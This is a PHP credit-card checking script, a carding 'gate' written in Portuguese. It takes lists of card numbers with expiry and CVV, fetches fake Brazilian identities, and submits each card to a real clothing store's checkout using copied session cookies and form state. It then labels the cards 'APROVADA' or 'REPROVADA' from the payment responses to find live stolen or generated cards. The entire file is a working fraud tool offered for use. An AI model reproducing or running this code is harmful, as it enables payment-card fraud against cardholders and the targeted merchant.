<?php
error_reporting(0);
set_time_limit(0);

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

extract($_GET);

function getStr($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

$separador = explode("|", $lista);
$cc = trim($separador[0]);


$cctwo = substr("$cc", 0, 6);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);


$banco = getStr($fim, '"bank":{"name":"', '"');
$pais = getStr($fim, '"name":"', '"');
$nivel = getStr($fim, '"brand":"', '"');

if(strpos($fim, '"type":"credit"') !== false) {
	$tipo = 'Credito';
} else {
	$tipo = 'Debito';
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","Â»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

if($ano == 2019){  //QUANDO O ANO DO GATE NÃƒO TIVER 20, USE ESSA FUNÃ‡ÃƒO '.$ano1.'
$ano1 = "19";
}else if($ano == 2020){
$ano1 = "20";
}else if($ano == 2021){
$ano1 = "21";
}else if($ano == 2022){
$ano1 = "22";
}else if($ano == 2023){
$ano1 = "23";
}else if($ano == 2024){
$ano1 = "24";
}else if($ano == 2025){
$ano1 = "25";
}else if($ano == 2026){
$ano1 = "26";
}else if($ano == 2027){
$ano1 = "27";
}else if($ano == 2028){
$ano1 = "28";
}else if($ano == 2029){
$ano1 = "29";
}else if($ano == 2030){
$ano1 = "30";
}else if($ano == 2031){
$ano1 = "31";
}else{
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> Validade Invalida</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}

/*if($cc[0]==4){ //QUANDO VOCÃŠ NÃƒO QUISER QUE TESTE UMA TAL GERADA NO GATE
'<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==5){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==3){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==2){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==1){
     '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}*/

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

//=========================================//4 DEVS PHP//=========================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, true);

$name = $dados1["nome"];
$cpf = $dados1["cpf"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$celular = $dados1["celular"];
$email = mt_rand();

//=========================================//PEGAR AS REQUEST DO TOKEN DO SITE//=========================================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.malhariarose.com.br/pedido_finalizado.aspx?erro=true&p=d0ITZ2MKOF8%3d&mensagem=Unauthorized.+Invalid+security+code.');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'host: www.malhariarose.com.br',
'origin: https://www.malhariarose.com.br',
'referer: https://www.malhariarose.com.br/pedido_finalizado.aspx?erro=true&p=d0ITZ2MKOF8=&mensagem=Unauthorized.%20Invalid%20security%20code.',
'cookie: _ga=GA1.3.1590404861.1590985930;ASP.NET_SessionId=nzdg5aspvt4uzzlt3x2gzme5;Visitante_Id_2=186.233.178.20.160;acesso=acesso=0mJezmF4dApUTkhRAqvx48Xw+CgUUsz8;_gid=GA1.3.275921630.1591914622;cliente=id=Kn+1SaNSvkY=&nome=8gsgeAgH5I9oAO5YF1WRObqkKmkDO9v8&email=4sOIXOpqm5FW1pNfQx/6y2/SU0okml88;carrinho=',
'sec-fetch-mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ctl00%24ScriptManager1=ctl00%24AreaCentral%24updatePanel2%7Cctl00%24AreaCentral%24btnPagar&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTY5ODU1Mzk0Mw8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBFgJmD2QWBAIBD2QWBgIUDxYCHgRocmVmBRgvd2lkZ2V0LmNzcz9wYWdpbmFfaWQ9MTBkAhwPFgIeBFRleHQFugI8IS0tIEdsb2JhbCBzaXRlIHRhZyAoZ3RhZy5qcykgLSBHb29nbGUgQW5hbHl0aWNzIC0tPgo8c2NyaXB0IGFzeW5jIHNyYz0iaHR0cHM6Ly93d3cuZ29vZ2xldGFnbWFuYWdlci5jb20vZ3RhZy9qcz9pZD1HQV9UUkFDS0lOR19JRCI%2BPC9zY3JpcHQ%2BCjxzY3JpcHQ%2BCiAgd2luZG93LmRhdGFMYXllciA9IHdpbmRvdy5kYXRhTGF5ZXIgfHwgW107CiAgZnVuY3Rpb24gZ3RhZygpe2RhdGFMYXllci5wdXNoKGFyZ3VtZW50cyk7fQogIGd0YWcoJ2pzJywgbmV3IERhdGUoKSk7CgogIGd0YWcoJ2NvbmZpZycsICdVQS02MDE1MjM1Mi0xJyk7Cjwvc2NyaXB0PmQCHQ8WAh8CBV48bWV0YSBuYW1lPSJnb29nbGUtc2l0ZS12ZXJpZmljYXRpb24iIGNvbnRlbnQ9IllBcTcxdmkzb3J1dkFtajgyYXdNU1dmY1N6bTlhWWlVX2RVR3ppQl9NT28iIC8%2BZAIDDxYCHghpdGVtdHlwZQUfaHR0cDovL3NjaGVtYS5vcmcvQ2xvdGhpbmdTdG9yZRYCAgEPZBYKAgEPDxYCHwIFkwQ8ZGl2IGNsYXNzPSJmdWxsLXdpZHRoIj4NCiAgICA8ZGl2IGNsYXNzPSJjYWJlY2FsaG8iPjxkaXYgY2xhc3M9ImFyZWEiIGlkPSJhcmVhLTEiPiMjQEBjYWJlY2FsaG8tQXJlYS0xIyM8L2Rpdj48L2Rpdj4NCjwvZGl2Pg0KDQogPGRpdiBjbGFzcz0iY29udGVudC1jZW50ZXIgZnVsbC13aWR0aCI%2BDQogICAgPGRpdiBjbGFzcz0nY29udGV1ZG8gY29udGVudC1wdXNoJz4NCiAgICAgICAgPGRpdiBjbGFzcz0ncm93Jz4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFyZWEgY29sLW1kLTEyIiBpZD0iYXJlYS0xIj4NCiAgICAgICAgICAgICAgICAjI0BAY29udGV1ZG8tYXJlYS0xIyMgDQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY%2BDQogICAgPC9kaXY%2BDQoNCjwvZGl2PjxkaXYgY2xhc3M9InJvZGFwZS1jb250ZW50IGNvbnRlbnQtY2VudGVyIj4NCg0KICAgIDxkaXYgY2xhc3M9InJvZGFwZSI%2BPGRpdiBjbGFzcz0iYXJlYSIgaWQ9ImFyZWEtMSI%2BIyNAQHJvZGFwZS1BcmVhLTEjIzwvZGl2PjwvZGl2Pg0KDQo8L2Rpdj5kZAIJD2QWAmYPZBYCAgUPZBYCAgEPZBYGAgEPFgIeB1Zpc2libGVoFgpmDxYCHwIFBDUwNDdkAgEPFgIfAgUQSm9yZ2UgU2lsdmEgTGltYWQCAg8WAh8CBRBDYXJ0w6NvIHZpYSBSRURFZAIEDxYCHwIFMjxpIGNsYXNzPSdmYSBmYS1jbG9jay1vJz48L2k%2BIEFndWFyZGFuZG8gcGFnYW1lbnRvZAIFDxYCHwIFCFIkMzk1LDkwZAIDD2QWAgIBDxBkZBYBZmQCBw8WAh8EZxYEAg0PZBYCZg9kFgICAQ8QZBAVBwlTZWxlY2lvbmUYMSB4IFIkMzk1LDkwIC0gc2VtIGp1cm9zGDIgeCBSJDE5Nyw5NSAtIHNlbSBqdXJvcxgzIHggUiQxMzEsOTcgLSBzZW0ganVyb3MXNCB4IFIkOTgsOTggLSBzZW0ganVyb3MXNSB4IFIkNzksMTggLSBzZW0ganVyb3MXNiB4IFIkNjUsOTggLSBzZW0ganVyb3MVBwEwATEBMgEzATQBNQE2FCsDB2dnZ2dnZ2dkZAIlDxYCHwIFCFIkMzk1LDkwZAITD2QWBAIBDxYCHwIFzgQ8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hcGlzLmdvb2dsZS5jb20vanMvcGxhdGZvcm0uanM%2Fb25sb2FkPXJlbmRlck9wdEluIiBhc3luYyBkZWZlcj48L3NjcmlwdD4KCjxzY3JpcHQ%2BCiAgd2luZG93LnJlbmRlck9wdEluID0gZnVuY3Rpb24oKSB7CiAgICB3aW5kb3cuZ2FwaS5sb2FkKCdzdXJ2ZXlvcHRpbicsIGZ1bmN0aW9uKCkgewogICAgICB3aW5kb3cuZ2FwaS5zdXJ2ZXlvcHRpbi5yZW5kZXIoCiAgICAgICAgewogICAgICAgICAgLy8gUkVRVUlSRUQgRklFTERTCiAgICAgICAgICAibWVyY2hhbnRfaWQiOiA4MzYyMzI2LAogICAgICAgICAgIm9yZGVyX2lkIjogIk9SREVSX0lEIiwKICAgICAgICAgICJlbWFpbCI6ICJDVVNUT01FUl9FTUFJTCIsCiAgICAgICAgICAiZGVsaXZlcnlfY291bnRyeSI6ICJDT1VOVFJZX0NPREUiLAogICAgICAgICAgImVzdGltYXRlZF9kZWxpdmVyeV9kYXRlIjogIllZWVktTU0tREQiLAoKICAgICAgICAgIC8vIE9QVElPTkFMIEZJRUxEUwogICAgICAgICAgInByb2R1Y3RzIjogW3siZ3RpbiI6IkdUSU4xIn0sIHsiZ3RpbiI6IkdUSU4yIn1dCiAgICAgICAgfSk7CiAgICB9KTsKICB9Cjwvc2NyaXB0PmQCAw8WAh8CBb4KPHNjcmlwdD4NCi8qIEPDs2RpZ28gZGUgYWNvbXBhbmhhbWVudG8gcGFyYSBlLWNvbW1lcmNlIGRvIEdBLkpTICovDQpnYSgncmVxdWlyZScsICdlY29tbWVyY2UnKTsNCmdhKCdlY29tbWVyY2U6YWRkVHJhbnNhY3Rpb24nLCB7CiAgJ2lkJzogJzUwNDcnLCAgICAgICAgICAgICAgICAgIAogICdhZmZpbGlhdGlvbic6ICdNYWxoYXJpYSBSb3NlJywKICAncmV2ZW51ZSc6ICczOTUsOScsIAogICdzaGlwcGluZyc6ICcwJywgCiAgJ3RheCc6ICcwJyAgICAgICAgICAgICAKICAnY3VycmVuY3knOiAnQlJMJyAgICAgIAp9KTsNCmdhKCdlY29tbWVyY2U6YWRkSXRlbScsIHsKICAnaWQnOiAnMjQ3MjknLCAgICAgICAgICAgICAgIAogICduYW1lJzogJ0JsdXNhIEphY3F1YXJkIEFuaW1hbCBwcmludCcsIAogICdza3UnOiAnNDE3ICAgICAgICAgICAgICAgICAnLCAKICAnY2F0ZWdvcnknOiAnJywgICAgICAgICAKICAncHJpY2UnOiAnNDAsMDAnLCAKICAncXVhbnRpdHknOiAnMicgIAp9KTtnYSgnZWNvbW1lcmNlOmFkZEl0ZW0nLCB7CiAgJ2lkJzogJzI0NzMwJywgICAgICAgICAgICAgICAKICAnbmFtZSc6ICdDYXBhIGVtIGphY3F1YXJkJywgCiAgJ3NrdSc6ICc0MTIgICAgICAgICAgICAgICAgICcsIAogICdjYXRlZ29yeSc6ICcnLCAgICAgICAgIAogICdwcmljZSc6ICc0NiwwMCcsIAogICdxdWFudGl0eSc6ICcyJyAgCn0pO2dhKCdlY29tbWVyY2U6YWRkSXRlbScsIHsKICAnaWQnOiAnMjQ3MzEnLCAgICAgICAgICAgICAgIAogICduYW1lJzogJ0JsdXNhIENhbm9hIFRyYW7Dp2EgbGlzdHJhIG5hIGJhcnJhJywgCiAgJ3NrdSc6ICc0MTAgICAgICAgICAgICAgICAgICcsIAogICdjYXRlZ29yeSc6ICcnLCAgICAgICAgIAogICdwcmljZSc6ICc1MCwwMCcsIAogICdxdWFudGl0eSc6ICcyJyAgCn0pO2dhKCdlY29tbWVyY2U6YWRkSXRlbScsIHsKICAnaWQnOiAnMjQ3MzInLCAgICAgICAgICAgICAgIAogICduYW1lJzogJ0Nhc2FjbyBNb3Vzc2UgRnVyb3MnLCAKICAnc2t1JzogJzM4NCAgICAgICAgICAgICAgICAgJywgCiAgJ2NhdGVnb3J5JzogJycsICAgICAgICAgCiAgJ3ByaWNlJzogJzcwLDAwJywgCiAgJ3F1YW50aXR5JzogJzInICAKfSk7Z2EoJ2Vjb21tZXJjZTphZGRJdGVtJywgewogICdpZCc6ICcyNDczMycsICAgICAgICAgICAgICAgCiAgJ25hbWUnOiAnQmx1c2EgTGlzdHJhZGEgViBGYW5nJywgCiAgJ3NrdSc6ICczODkgICAgICAgICAgICAgICAgICcsIAogICdjYXRlZ29yeSc6ICcnLCAgICAgICAgIAogICdwcmljZSc6ICc1MiwwMCcsIAogICdxdWFudGl0eSc6ICcyJyAgCn0pOw0KZ2EoJ2Vjb21tZXJjZTpzZW5kJyk7DQo8L3NjcmlwdD4NCmQCGQ8WAh8CZWQCHQ9kFgJmD2QWBgIHD2QWAmYPZBYCAgEPZBYCAgMPEGRkFgFmZAIND2QWAgICDxYCHwRnZAIPD2QWAmYPZBYCAgEPZBYEAgEPDxYCHwIFBlIkMCwwMGRkAgMPDxYCHwIFATBkZGRPisMCvy3bMezOn7nEqOcTfn4bCW0fJl3k5Pl1ZTP8UQ%3D%3D&__VIEWSTATEGENERATOR=281EEBEE&__EVENTVALIDATION=%2FwEdAFCStiRzB27%2FKK47onkH2g4Wg9%2Fjtnoyzs84HUEYfTJ57AVVaJVBxVlUosaMK7ywjVPjrVIVULOm%2BUE4YgNPXIjxbb69yrUY0dHqGcUxV5im3YyQSbu1OdTPcBSJ4VrXovyLRw8EN04kuixxgydEm%2BadSWQHR9g2CS9%2FsOUXiNqgvqWIPH8fyVw8TK1FWQH27Qy51zyrhVtx%2BhraozFYBj2mXGY3uQ3vlZF6v36OF1ogZ4KrYqGRguib%2F7MqdVZHGqg5EZt9fyHWqGAQSCNk%2BMqHICu7Xmx2pVL%2B3mekCP6G3EQPSaDJCXiOIy8xMS0jiGOUWrnuGRWCABbgpP87F8kdc92IEOskBco5cIeL7QJP%2F8n8wrOUKZsMH1ooLQ2lhAB2ORX1InNdsgsQbv0lPiCb%2FAxoYNfe6dK9x6JelISrcf00%2BM69jMCknng1FLEx4P%2BfNz1Ign6flbYtywOn2AuddaaCRK%2F8QXPIhB4zYY6d1SuhYz5bEIpLOT3dhvcMmnQ9ucjKywYA70XPZhd1AOpQnwmbkhZeCs5VUelA1cLzNz7%2BHcY5njip3le%2BxTU654tLb5YkYCGq%2FvFdffJrDX0FwbIQTN8HdfeyKwEK1%2FhjyIkBCvUzboEHjNptzkRqMcGL4Pz3X4tkH6ijz679bnuKXmw8Y7bcW00jZ4uowRotnBrjmE6eD6KAAHMih2MwgI8dlL4HvDrXLAM6PRK2%2FJhB4R1tDQ6vtdkLasrw0ZUxdfGPw%2F9w%2FfMKFg0oR57iD7VLQP6f1ljwO6jofCwV9Y9%2BKsZg%2B62xCe6g0mRu1M0KUo94f5adB5kO6LjQJUvSII39pLoE3XgrKWRDDpv%2BZb%2BRDZRSvBVe80ct1KZTMznBq35ZEEKLEWGf803vjurHQohuwR9DmV3ZrITSY%2FRVmrcy%2BCaxD64U77MA24sZT0dj7FGSmArXIfhqZYipbI7vWKiDpDO%2FjJGi4xyAe9dsbpW97X77pmZWoLl8dhWba7JhR1dFAMuuoANq5%2FmHNwsBHlkb28M5cLOLxePJq52Fwll9rDxV3Dvle2PLNK09yXLKRLFHriIGwPfW4NFPBYTuBHLK6%2Fi%2FmE8fFrvgpV1vlgRA91EvZm0pl%2FwvGvvNls2kiwXBGp%2FDzKYOlRivtCK0nFLeo1VI2snyRtDTQhHFBaLrNKxvENVC2eZyXX9khX532wgDw5uCPeJ9LgtpHB%2BKlvvJksek7qIA90o4aBirP3rwP2SyeNqhepY53YG0gN5wSRigqiRlJ6G5kqE4EL%2F8J%2BmzZBD8i6bxwa2rPba7w5vAmMqN89qmcfneRXP1V0bt%2BW635liekEqf1CL%2Fovwz2rMVjcOwt2iZxuXbT8%2FJ99h277PiuzlD%2BVuIy0ay3doRB5k8teggjiUhbtmkTk7YcNHhzCt8ua5lHsVF7lhA%2FsPtQl1YiVnvTPPTMZKcOn%2Fz8IEzBqJQckgYZRfBqwvqMGFbeiv4WqnNkFhzu4M71nvuw%2BiIUBABXmpNK9qZ4mGRZJW9u1n8WVFi3RFKVlQHtW%2BzMRjCvSRlkO4NTSS9wo5N6V4S9G7EZ30YaL9SKtfNJjEsmyb8sNOK%2BMy3qPRSAiF48XI0bTwtdFyoGnmJl9vH62NGtFNr7Ye9qkuzInQZ3Ik2ezXQhjIFHEtUGp%2Fpq0uiDGVklSMyRAW9JlPQUi4AbaX0lOzfvyx9oekzKs1Yb416%2BsDNo5Oo2FQksml%2FRPPIkX%2Fm31y5qHdJmlCAXwNu&ctl00%24ctl18%24edtWidget_Id=9523876&ctl00%24ctl18%24edtWidget_Nome=&ctl00%24ctl18%24edtWidget_Template=&ctl00%24ctl18%24busca%24edtProcurar=&ctl00%24AreaCentral%24edtCartao_Numero='.$cc.'&ctl00%24AreaCentral%24edtCartao_Cod='.$cvv.'&ctl00%24AreaCentral%24edtCartao_Mes='.$mes.'&ctl00%24AreaCentral%24edtCartao_Ano='.$ano.'&ctl00%24AreaCentral%24lstCartao_Parcela=1&ctl00%24AreaCentral%24edtCartao_Nome=Felipe%20Dias%20nascimento&ctl00%24AreaCentral%24edtCartao_DataNascimento=15%2F08%2F1988&ctl00%24AreaCentral%24edtCartao_CPF=&ctl00%24AreaCentral%24edtCartao_Telefone=&ctl00%24AreaCentral%24edtCobranca_Cep=&ctl00%24AreaCentral%24edtCobranca_Cidade=&ctl00%24AreaCentral%24lstCobranca_Estado=&ctl00%24AreaCentral%24edtCobranca_Rua=&ctl00%24AreaCentral%24edtCobranca_Numero=&ctl00%24AreaCentral%24edtCobranca_Bairro=&ctl00%24AreaCentral%24edtCobranca_Complemento=&ctl00%24AreaCentral%24edtPedido_ValorTotal=R%24395%2C90&ctl00%24AreaCentral%24edtSubmit=1&ctl00%24AreaCentral%24edtCartao=visa&ctl00%24AreaCentral%24edtCartao_Token=&ctl00%24AreaCentral%24edtSenderHash=20550c53e8d2f4493243cdadd407238bd559a51156387a83be630cc824670fbd&ctl00%24AreaCentral%24edtBanco_Codigo=&ctl00%24AreaCentral%24edtPedido_Tipo=1&ctl00%24AreaCentral%24edtPagamento_Id=8&ctl00%24AreaCentral%24edtMoip_Forma=&ctl00%24AreaCentral%24edtMoip_Instituicao=&ctl00%24AreaCentral%24edtMoip_Status=&ctl00%24AreaCentral%24edtMoip_CodigoMoIP=&ctl00%24AreaCentral%24edtMoip_CodigoRetorno=&ctl00%24AreaCentral%24edtMoip_Token=&ctl00%24ctl21%24edtWidget_Id=9523877&ctl00%24edtProcurar=&ctl00%24popup%24edtassinante_nome=&ctl00%24popup%24edtassinante_email=&__ASYNCPOST=true&ctl00%24AreaCentral%24btnPagar=aguarde...');
$retorn = curl_exec($ch);

include("bin.php");
$bin = ''.$banco.' ('.$pais.') '.$nivel.' - '.$tipo.'';

if (strpos($retorn, 'Unauthorized. Please try again.') !== false) {
echo
"APROVADA $lista|$bin  Retorno: Please try again (GERADA MASTER LIVE) #fredoapp";

}elseif (strpos($retorn, 'Unauthorized. Invalid security code.') !== false) {
echo
"APROVADA $lista|$bin  Retorno: Invalid security code.  #fredo.app";


}elseif (strpos($retorn, 'Success') !== false) {
	
echo "APROVADA $lista|$bin  CVV ENCONTRADO (FINDOU)'<b>  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Restricted card.') !== false) {
echo
"REPROVADA $lista|$bin  Retorno: Cartão Restrito.  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Nonexistent card.') !== false) {
echo "REPROVADA $lista|$bin  Retorno: Cartão não existente.  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Transaction type not allowed for this card.') !== false) {

echo "REPROVADA $lista|$bin  Transação não permitida.  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Value not allowed for this type of card.') !== false) {
	
echo
"APROVADA $lista|$bin  Retorno: Cartão com saldo baixo, porém live  #fredo.app";


}elseif (strpos($retorn, 'Unauthorized. Expiry date expired.') !== false) {
	
echo "REPROVADA $lista|$bin  Retorno: Cartão com a validade vencida ou expirada  #fredo.app";

}elseif (strpos($retorn, 'Unauthorized. Card locked.') !== false) {

echo "REPROVADA $lista|$bin  Retorno: Cartão bloqueado, um dia útil #fredo.app";
 }
else{
echo "REPROVADA $lista|$bin  Error.";

}

?>